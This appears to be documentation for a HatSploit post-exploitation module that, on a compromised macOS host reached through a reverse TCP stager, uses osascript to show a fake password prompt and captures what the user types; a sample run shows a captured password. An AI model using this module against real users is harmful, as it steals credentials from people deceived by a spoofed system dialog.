# `post/macos/membrane/gather/prompt`

## Description

This module uses system `osascript` to prompt user to type password.

## Verification Steps

1. Start HatSploit
2. Run `exploit/macos/stager/membrane_reverse_tcp` on target
3. Do: `use post/macos/membrane/gather/prompt`
4. Do: `set SESSION` to your target session
5. Do: `run`

## Options

| Option    | Default Value | Required | Description        |
|-----------|---------------|----------|--------------------|
| `SESSION` | 0             | yes      | Session to run on. |

**SESSION**

Variable that contains session id to run post module on it.

## Scenarios

```
(hsf: post: macos/membrane/gather/prompt)> run
[*] Waiting for prompt window to appear...
[*] Waiting for user to type password...
[i] User entered: mysuperstrongpassword1234
(hsf: post: macos/membrane/gather/prompt)>
```
